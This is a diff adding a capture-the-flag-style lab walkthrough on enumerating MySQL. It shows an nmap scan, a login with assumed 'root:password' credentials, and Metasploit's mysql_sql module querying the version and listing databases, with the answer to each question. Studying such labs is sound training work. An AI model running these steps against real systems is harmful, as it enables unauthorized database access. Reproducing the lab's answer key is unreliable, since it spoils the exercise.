@@ -783,3 +783,221 @@ e. What major social network uses MySQL as their back-end database? This will re
 sol. Facebook
 
 TASK 9: Enumerating MySQL
+- The Scenario
+	Typically, you will have gained some initial credentials from enumerating other services that you can then use to enumerate and exploit the MySQL service.
+	As this room focuses on exploiting and enumerating the network service, for the sake of the scenario,
+	we're going to assume that you found the credentials: "root:password" while enumerating subdomains of a web server.
+	After trying the login against SSH unsuccessfully, you decide to try it against MySQL.
+
+a. As always, let's start out with a port scan, so we know what port the service we're trying to attack is running on. What port is MySQL using?
+sol. 3306
+┌──(kali㉿kali)-[~]
+└─$ sudo nmap -Pn -p- -T4 -A 10.10.77.8        
+[sudo] password for kali: 
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-24 21:56 EDT
+Stats: 0:05:24 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 36.69% done; ETC: 22:11 (0:09:19 remaining)
+Stats: 0:08:09 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 51.75% done; ETC: 22:12 (0:07:36 remaining)
+Nmap scan report for 10.10.77.8
+Host is up (0.17s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 06:36:56:2f:f0:d4:a4:d2:ab:6a:43:3e:c0:f9:9b:2d (RSA)
+|   256 30:bd:be:28:bd:32:dc:f6:ff:28:b2:57:57:31:d9:cf (ECDSA)
+|_  256 f2:3b:82:4a:5c:d2:18:19:89:1f:cd:92:0a:c7:cf:65 (ED25519)
+3306/tcp open  mysql   MySQL 5.7.29-0ubuntu0.18.04.1
+| ssl-cert: Subject: commonName=MySQL_Server_5.7.29_Auto_Generated_Server_Certificate
+| Not valid before: 2020-04-23T10:13:27
+|_Not valid after:  2030-04-21T10:13:27
+| mysql-info: 
+|   Protocol: 10
+|   Version: 5.7.29-0ubuntu0.18.04.1
+|   Thread ID: 8
+|   Capabilities flags: 65535
+|   Some Capabilities: IgnoreSigpipes, SupportsTransactions, InteractiveClient, FoundRows, Support41Auth, ODBCClient, SwitchToSSLAfterHandshake, SupportsCompression, Speaks41ProtocolOld, Speaks41ProtocolNew, ConnectWithDatabase, LongColumnFlag, DontAllowDatabaseTableColumn, LongPassword, SupportsLoadDataLocal, IgnoreSpaceBeforeParenthesis, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments
+|   Status: Autocommit
+|   Salt: *tI\x08o;>QUHX4-_fQ[\\x18"
+|_  Auth Plugin Name: mysql_native_password
+|_ssl-date: TLS randomness does not represent time
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.94SVN%E=4%D=10/24%OT=22%CT=1%CU=44114%PV=Y%DS=2%DC=T%G=Y%TM=671
+OS:AFEA0%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10A%TI=Z%CI=Z%TS=B)SEQ(
+OS:SP=102%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=102%GCD=4%ISR=10A%TI=Z%C
+OS:I=Z%II=I%TS=A)OPS(O1=M508ST11NW6%O2=M508ST11NW6%O3=M508NNT11NW6%O4=M508S
+OS:T11NW6%O5=M508ST11NW6%O6=M508ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5
+OS:=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M508NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%
+OS:T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
+OS:R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T
+OS:=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=
+OS:0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(
+OS:R=Y%DFI=N%T=40%CD=S)
+
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 1025/tcp)
+HOP RTT       ADDRESS
+1   170.65 ms 10.9.0.1
+2   170.85 ms 10.10.77.8
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 968.88 seconds
+
+b. Good, now- we think we have a set of credentials. Let's double check that by manually connecting to the MySQL server. We can do this using the command "mysql -h [IP] -u [username] -p"
+┌──(kali㉿kali)-[~]
+└─$ mysql -h 10.10.77.8 -u root -p 
+Enter password: 
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MySQL connection id is 4
+Server version: 5.7.29-0ubuntu0.18.04.1 (Ubuntu)
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MySQL [(none)]> quit
+Bye
+
+c. Okay, we know that our login credentials work. Lets quit out of this session with "exit" and launch up Metasploit.
+┌──(kali㉿kali)-[~]
+└─$ sudo msfconsole                
+[sudo] password for kali: 
+Metasploit tip: View missing module options with show missing
+                                                  
+
+  Metasploit Park, System Security Interface
+  Version 4.0.5, Alpha E
+  Ready...
+  > access security
+  access: PERMISSION DENIED.
+  > access security grid
+  access: PERMISSION DENIED.
+  > access main security grid
+  access: PERMISSION DENIED....and...
+  YOU DIDN'T SAY THE MAGIC WORD!
+  YOU DIDN'T SAY THE MAGIC WORD!
+  YOU DIDN'T SAY THE MAGIC WORD!
+  YOU DIDN'T SAY THE MAGIC WORD!
+  YOU DIDN'T SAY THE MAGIC WORD!
+  YOU DIDN'T SAY THE MAGIC WORD!
+  YOU DIDN'T SAY THE MAGIC WORD!
+
+
+       =[ metasploit v6.3.55-dev                          ]
++ -- --=[ 2397 exploits - 1235 auxiliary - 422 post       ]
++ -- --=[ 1391 payloads - 46 encoders - 11 nops           ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+
+msf6 > 
+
+d. We're going to be using the "mysql_sql" module.
+Search for, select and list the options it needs. What three options do we need to set? (in descending order).
+sol. PASSWORD/RHOSTS/USERNAME
+msf6 > search mysql_sql
+
+Matching Modules
+================
+
+   #  Name                             Disclosure Date  Rank    Check  Description
+   -  ----                             ---------------  ----    -----  -----------
+   0  auxiliary/admin/mysql/mysql_sql                   normal  No     MySQL SQL Generic Query
+
+
+Interact with a module by name or index. For example info 0, use 0 or use auxiliary/admin/mysql/mysql_sql
+
+msf6 > use auxiliary/admin/mysql/mysql_sql 
+msf6 auxiliary(admin/mysql/mysql_sql) > show options
+
+Module options (auxiliary/admin/mysql/mysql_sql):
+
+   Name      Current Setting   Required  Description
+   ----      ---------------   --------  -----------
+   PASSWORD                    no        The password for the specified username
+   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT     3306              yes       The target port (TCP)
+   SQL       select version()  yes       The SQL to execute.
+   USERNAME                    no        The username to authenticate as
+
+
+View the full module info with the info, or info -d command.
+
+e. Run the exploit. By default it will test with the "select version()" command, what result does this give you?
+sol. 5.7.29-0ubuntu0.18.04.1
+msf6 auxiliary(admin/mysql/mysql_sql) > set rhosts 10.10.77.8
+rhosts => 10.10.77.8
+msf6 auxiliary(admin/mysql/mysql_sql) > set username root
+username => root
+msf6 auxiliary(admin/mysql/mysql_sql) > set password password
+password => password
+msf6 auxiliary(admin/mysql/mysql_sql) > show options
+
+Module options (auxiliary/admin/mysql/mysql_sql):
+
+   Name      Current Setting   Required  Description
+   ----      ---------------   --------  -----------
+   PASSWORD  password          no        The password for the specified username
+   RHOSTS    10.10.77.8        yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT     3306              yes       The target port (TCP)
+   SQL       select version()  yes       The SQL to execute.
+   USERNAME  root              no        The username to authenticate as
+
+
+View the full module info with the info, or info -d command.
+
+msf6 auxiliary(admin/mysql/mysql_sql) > run
+[*] Running module against 10.10.77.8
+
+[*] 10.10.77.8:3306 - Sending statement: 'select version()'...
+[*] 10.10.77.8:3306 -  | 5.7.29-0ubuntu0.18.04.1 |
+[*] Auxiliary module execution completed
+
+f. Great! We know that our exploit is landing as planned. Let's try to gain some more ambitious information. Change the "sql" option to "show databases". how many databases are returned?
+sol. 4
+msf6 auxiliary(admin/mysql/mysql_sql) > show options
+
+Module options (auxiliary/admin/mysql/mysql_sql):
+
+   Name      Current Setting   Required  Description
+   ----      ---------------   --------  -----------
+   PASSWORD  password          no        The password for the specified username
+   RHOSTS    10.10.77.8        yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT     3306              yes       The target port (TCP)
+   SQL       select version()  yes       The SQL to execute.
+   USERNAME  root              no        The username to authenticate as
+
+
+View the full module info with the info, or info -d command.
+msf6 auxiliary(admin/mysql/mysql_sql) > set SQL show databases
+SQL => show databases
+msf6 auxiliary(admin/mysql/mysql_sql) > show options
+
+Module options (auxiliary/admin/mysql/mysql_sql):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   PASSWORD  password         no        The password for the specified username
+   RHOSTS    10.10.77.8       yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT     3306             yes       The target port (TCP)
+   SQL       show databases   yes       The SQL to execute.
+   USERNAME  root             no        The username to authenticate as
+
+
+View the full module info with the info, or info -d command.
+
+msf6 auxiliary(admin/mysql/mysql_sql) > run
+[*] Running module against 10.10.77.8
+
+[*] 10.10.77.8:3306 - Sending statement: 'show databases'...
+[*] 10.10.77.8:3306 -  | information_schema |
+[*] 10.10.77.8:3306 -  | mysql |
+[*] 10.10.77.8:3306 -  | performance_schema |
+[*] 10.10.77.8:3306 -  | sys |
+[*] Auxiliary module execution completed
+
+TASK 10: Exploiting MySQL
